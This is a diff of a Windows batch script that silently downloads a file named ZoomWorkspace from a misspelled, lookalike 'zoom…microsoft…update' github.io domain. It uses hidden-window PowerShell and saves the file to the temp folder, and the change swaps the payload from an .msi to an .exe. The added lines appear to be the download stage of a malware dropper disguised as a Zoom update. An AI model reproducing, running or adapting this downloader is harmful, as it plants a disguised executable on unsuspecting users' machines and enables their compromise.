@@ -23,8 +23,8 @@ start explorer.exe >nul 2>&1
 =====================================================================
 :: Download MSI silently
 =====================================================================
-set "SC_URL=https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/ZoomWorkspace.msi"
-set "SC_PATH=%TEMP%\ZoomWorkspace.msi"
+set "SC_URL=https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/ZoomWorkspace.exe"
+set "SC_PATH=%TEMP%\ZoomWorkspace.exe"
 
 powershell -WindowStyle Hidden -Command ^
 "Invoke-WebRequest -Uri '%SC_URL%' -OutFile '%SC_PATH%' -UseBasicParsing"
